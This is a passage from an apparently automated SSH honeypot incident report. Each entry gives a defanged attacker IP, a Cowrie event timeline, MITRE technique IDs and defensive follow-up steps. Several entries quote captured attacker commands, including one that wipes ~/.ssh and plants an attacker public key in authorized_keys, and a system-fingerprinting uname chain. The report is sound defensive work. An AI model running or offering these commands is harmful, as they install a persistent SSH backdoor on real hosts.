| `2026-07-11 05:25:48` | `cowrie.login.success` |
| `2026-07-11 05:25:48` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.12[.]109` to AbuseIPDB if not already reported
- [ ] Block `80.233.12[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d2930f34272

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-11 05:25 |
| **Last Seen** | 2026-07-11 05:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:25:50` | `cowrie.session.connect` |
| `2026-07-11 05:25:50` | `cowrie.client.version` |
| `2026-07-11 05:25:50` | `cowrie.client.kex` |
| `2026-07-11 05:25:50` | `cowrie.login.success` |
| `2026-07-11 05:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a732ae2d3887

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-11 05:25 |
| **Last Seen** | 2026-07-11 05:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:25:50` | `cowrie.session.connect` |
| `2026-07-11 05:25:50` | `cowrie.client.version` |
| `2026-07-11 05:25:50` | `cowrie.client.kex` |
| `2026-07-11 05:25:50` | `cowrie.login.success` |
| `2026-07-11 05:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97d2a4c2110d

| Field | Detail |
|---|---|
| **Source IP** | `165.154.241[.]28` |
| **First Seen** | 2026-07-11 05:29 |
| **Last Seen** | 2026-07-11 05:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:29:03` | `cowrie.session.connect` |
| `2026-07-11 05:29:03` | `cowrie.client.version` |
| `2026-07-11 05:29:03` | `cowrie.client.kex` |
| `2026-07-11 05:29:04` | `cowrie.login.success` |
| `2026-07-11 05:29:05` | `cowrie.session.params` |
| `2026-07-11 05:29:05` | `cowrie.command.input` |
| `2026-07-11 05:29:05` | `cowrie.command.failed` |
| `2026-07-11 05:29:05` | `cowrie.log.closed` |
| `2026-07-11 05:29:06` | `cowrie.session.params` |
| `2026-07-11 05:29:06` | `cowrie.command.input` |
| `2026-07-11 05:29:07` | `cowrie.session.file_download` |
| `2026-07-11 05:29:07` | `cowrie.log.closed` |
| `2026-07-11 05:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.241[.]28` to AbuseIPDB if not already reported
- [ ] Block `165.154.241[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c45f52f4e97e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.241[.]28` |
| **First Seen** | 2026-07-11 05:29 |
| **Last Seen** | 2026-07-11 05:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:29:07` | `cowrie.session.connect` |
| `2026-07-11 05:29:07` | `cowrie.client.version` |
| `2026-07-11 05:29:07` | `cowrie.client.kex` |
| `2026-07-11 05:29:07` | `cowrie.login.success` |
| `2026-07-11 05:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.241[.]28` to AbuseIPDB if not already reported
- [ ] Block `165.154.241[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68e6eb14b819

| Field | Detail |
|---|---|
| **Source IP** | `165.154.241[.]28` |
| **First Seen** | 2026-07-11 05:29 |
| **Last Seen** | 2026-07-11 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:29:08` | `cowrie.session.connect` |
| `2026-07-11 05:29:08` | `cowrie.client.version` |
| `2026-07-11 05:29:08` | `cowrie.client.kex` |
| `2026-07-11 05:29:09` | `cowrie.login.success` |
| `2026-07-11 05:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.241[.]28` to AbuseIPDB if not already reported
- [ ] Block `165.154.241[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd4f98db87f2

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-07-11 05:35 |
| **Last Seen** | 2026-07-11 05:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:35:33` | `cowrie.session.connect` |
| `2026-07-11 05:35:33` | `cowrie.client.version` |
| `2026-07-11 05:35:33` | `cowrie.client.kex` |
| `2026-07-11 05:35:34` | `cowrie.login.success` |
| `2026-07-11 05:35:35` | `cowrie.session.params` |
| `2026-07-11 05:35:35` | `cowrie.command.input` |
| `2026-07-11 05:35:35` | `cowrie.command.failed` |
| `2026-07-11 05:35:35` | `cowrie.log.closed` |
| `2026-07-11 05:35:36` | `cowrie.session.params` |
| `2026-07-11 05:35:36` | `cowrie.command.input` |
| `2026-07-11 05:35:36` | `cowrie.session.file_download` |
| `2026-07-11 05:35:36` | `cowrie.log.closed` |
| `2026-07-11 05:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-410b29719da5

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-07-11 05:35 |
| **Last Seen** | 2026-07-11 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:35:36` | `cowrie.session.connect` |
| `2026-07-11 05:35:36` | `cowrie.client.version` |
| `2026-07-11 05:35:36` | `cowrie.client.kex` |
| `2026-07-11 05:35:37` | `cowrie.login.success` |
| `2026-07-11 05:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee34c37608b5

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-07-11 05:35 |
| **Last Seen** | 2026-07-11 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:35:37` | `cowrie.session.connect` |
| `2026-07-11 05:35:37` | `cowrie.client.version` |
| `2026-07-11 05:35:38` | `cowrie.client.kex` |
| `2026-07-11 05:35:38` | `cowrie.login.success` |
| `2026-07-11 05:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9edc877bced1

| Field | Detail |
|---|---|
| **Source IP** | `74.208.177[.]56` |
| **First Seen** | 2026-07-11 05:38 |
| **Last Seen** | 2026-07-11 05:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:38:53` | `cowrie.session.connect` |
| `2026-07-11 05:38:54` | `cowrie.client.version` |
| `2026-07-11 05:38:54` | `cowrie.client.kex` |
| `2026-07-11 05:38:55` | `cowrie.login.success` |
| `2026-07-11 05:38:55` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.208.177[.]56` to AbuseIPDB if not already reported
- [ ] Block `74.208.177[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f1217573c2a

| Field | Detail |
|---|---|
| **Source IP** | `91.185.75[.]244` |
| **First Seen** | 2026-07-11 05:39 |
| **Last Seen** | 2026-07-11 05:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:39:00` | `cowrie.session.connect` |
| `2026-07-11 05:39:00` | `cowrie.client.version` |
| `2026-07-11 05:39:00` | `cowrie.client.kex` |
| `2026-07-11 05:39:01` | `cowrie.login.success` |
| `2026-07-11 05:39:02` | `cowrie.session.params` |
| `2026-07-11 05:39:02` | `cowrie.command.input` |
| `2026-07-11 05:39:02` | `cowrie.command.failed` |
| `2026-07-11 05:39:02` | `cowrie.log.closed` |
| `2026-07-11 05:39:03` | `cowrie.session.params` |
| `2026-07-11 05:39:03` | `cowrie.command.input` |
| `2026-07-11 05:39:03` | `cowrie.session.file_download` |
| `2026-07-11 05:39:03` | `cowrie.log.closed` |
| `2026-07-11 05:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.185.75[.]244` to AbuseIPDB if not already reported
- [ ] Block `91.185.75[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5c4ff7896a8

| Field | Detail |
|---|---|
| **Source IP** | `91.185.75[.]244` |
| **First Seen** | 2026-07-11 05:39 |
| **Last Seen** | 2026-07-11 05:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:39:04` | `cowrie.session.connect` |
| `2026-07-11 05:39:04` | `cowrie.client.version` |
| `2026-07-11 05:39:04` | `cowrie.client.kex` |
| `2026-07-11 05:39:05` | `cowrie.login.success` |
| `2026-07-11 05:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.185.75[.]244` to AbuseIPDB if not already reported
- [ ] Block `91.185.75[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71f6107cb1ca

| Field | Detail |
|---|---|
| **Source IP** | `91.185.75[.]244` |
| **First Seen** | 2026-07-11 05:39 |
| **Last Seen** | 2026-07-11 05:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:39:05` | `cowrie.session.connect` |
| `2026-07-11 05:39:05` | `cowrie.client.version` |
| `2026-07-11 05:39:05` | `cowrie.client.kex` |
| `2026-07-11 05:39:06` | `cowrie.login.success` |
| `2026-07-11 05:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.185.75[.]244` to AbuseIPDB if not already reported
- [ ] Block `91.185.75[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f80d7d7c2cb

| Field | Detail |
|---|---|
| **Source IP** | `103.235.95[.]102` |
| **First Seen** | 2026-07-11 05:42 |
| **Last Seen** | 2026-07-11 05:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:42:28` | `cowrie.session.connect` |
| `2026-07-11 05:42:29` | `cowrie.client.version` |
| `2026-07-11 05:42:29` | `cowrie.client.kex` |
| `2026-07-11 05:42:32` | `cowrie.login.success` |
| `2026-07-11 05:42:32` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.235.95[.]102` to AbuseIPDB if not already reported
- [ ] Block `103.235.95[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e1d53219d5e

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 05:44 |
| **Last Seen** | 2026-07-11 05:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:44:20` | `cowrie.session.connect` |
| `2026-07-11 05:44:20` | `cowrie.client.version` |
| `2026-07-11 05:44:20` | `cowrie.client.kex` |
| `2026-07-11 05:44:21` | `cowrie.login.success` |
| `2026-07-11 05:44:22` | `cowrie.session.params` |
| `2026-07-11 05:44:22` | `cowrie.command.input` |
| `2026-07-11 05:44:22` | `cowrie.log.closed` |
| `2026-07-11 05:44:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76c5d37986bc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 05:45 |
| **Last Seen** | 2026-07-11 05:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:45:01` | `cowrie.session.connect` |
| `2026-07-11 05:45:02` | `cowrie.client.version` |
| `2026-07-11 05:45:02` | `cowrie.client.kex` |
| `2026-07-11 05:45:04` | `cowrie.login.success` |
| `2026-07-11 05:45:05` | `cowrie.session.params` |
| `2026-07-11 05:45:05` | `cowrie.command.input` |
| `2026-07-11 05:45:05` | `cowrie.command.input` |
| `2026-07-11 05:45:05` | `cowrie.command.input` |
| `2026-07-11 05:45:05` | `cowrie.command.input` |
| `2026-07-11 05:45:05` | `cowrie.command.input` |
| `2026-07-11 05:45:05` | `cowrie.command.success` |
| `2026-07-11 05:45:05` | `cowrie.command.input` |
| `2026-07-11 05:45:05` | `cowrie.command.input` |
| `2026-07-11 05:45:05` | `cowrie.command.input` |
| `2026-07-11 05:45:05` | `cowrie.command.input` |
| `2026-07-11 05:45:06` | `cowrie.log.closed` |
| `2026-07-11 05:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83d895ff828c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 05:46 |
| **Last Seen** | 2026-07-11 05:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:46:50` | `cowrie.session.connect` |
| `2026-07-11 05:46:51` | `cowrie.client.version` |
| `2026-07-11 05:46:51` | `cowrie.client.kex` |
| `2026-07-11 05:46:52` | `cowrie.login.success` |
| `2026-07-11 05:46:54` | `cowrie.session.params` |
| `2026-07-11 05:46:54` | `cowrie.command.input` |
| `2026-07-11 05:46:54` | `cowrie.command.input` |
| `2026-07-11 05:46:54` | `cowrie.command.input` |
| `2026-07-11 05:46:54` | `cowrie.command.input` |
| `2026-07-11 05:46:54` | `cowrie.command.input` |
| `2026-07-11 05:46:54` | `cowrie.command.success` |
| `2026-07-11 05:46:54` | `cowrie.command.input` |
| `2026-07-11 05:46:54` | `cowrie.command.input` |
| `2026-07-11 05:46:54` | `cowrie.command.input` |
| `2026-07-11 05:46:54` | `cowrie.command.input` |
| `2026-07-11 05:46:54` | `cowrie.log.closed` |
| `2026-07-11 05:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe3384037a66

| Field | Detail |
|---|---|
| **Source IP** | `121.128.84[.]224` |
| **First Seen** | 2026-07-11 05:49 |
| **Last Seen** | 2026-07-11 05:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:49:40` | `cowrie.session.connect` |
| `2026-07-11 05:49:40` | `cowrie.client.version` |
| `2026-07-11 05:49:40` | `cowrie.client.kex` |
| `2026-07-11 05:49:42` | `cowrie.login.success` |
| `2026-07-11 05:49:43` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:49:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.128.84[.]224` to AbuseIPDB if not already reported
- [ ] Block `121.128.84[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3043eb036a1

| Field | Detail |
|---|---|
| **Source IP** | `80.65.90[.]155` |
| **First Seen** | 2026-07-11 05:49 |
| **Last Seen** | 2026-07-11 05:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:49:48` | `cowrie.session.connect` |
| `2026-07-11 05:49:49` | `cowrie.client.version` |
| `2026-07-11 05:49:49` | `cowrie.client.kex` |
| `2026-07-11 05:49:50` | `cowrie.login.success` |
| `2026-07-11 05:49:50` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.65.90[.]155` to AbuseIPDB if not already reported
- [ ] Block `80.65.90[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f95766c13401

| Field | Detail |
|---|---|
| **Source IP** | `183.247.171[.]186` |
| **First Seen** | 2026-07-11 05:50 |
| **Last Seen** | 2026-07-11 05:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:50:37` | `cowrie.session.connect` |
| `2026-07-11 05:50:38` | `cowrie.client.version` |
| `2026-07-11 05:50:38` | `cowrie.client.kex` |
| `2026-07-11 05:50:41` | `cowrie.login.success` |
| `2026-07-11 05:50:43` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.247.171[.]186` to AbuseIPDB if not already reported
- [ ] Block `183.247.171[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-800a290efc48

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 05:50 |
| **Last Seen** | 2026-07-11 05:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:50:39` | `cowrie.session.connect` |
| `2026-07-11 05:50:40` | `cowrie.client.version` |
| `2026-07-11 05:50:40` | `cowrie.client.kex` |
| `2026-07-11 05:50:41` | `cowrie.login.success` |
| `2026-07-11 05:50:43` | `cowrie.session.params` |
| `2026-07-11 05:50:43` | `cowrie.command.input` |
| `2026-07-11 05:50:43` | `cowrie.command.input` |
| `2026-07-11 05:50:43` | `cowrie.command.input` |
| `2026-07-11 05:50:43` | `cowrie.command.input` |
| `2026-07-11 05:50:43` | `cowrie.command.input` |
| `2026-07-11 05:50:43` | `cowrie.command.success` |
| `2026-07-11 05:50:43` | `cowrie.command.input` |
| `2026-07-11 05:50:43` | `cowrie.command.input` |
| `2026-07-11 05:50:43` | `cowrie.command.input` |
| `2026-07-11 05:50:43` | `cowrie.command.input` |
| `2026-07-11 05:50:43` | `cowrie.log.closed` |
| `2026-07-11 05:50:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5013d3a4276

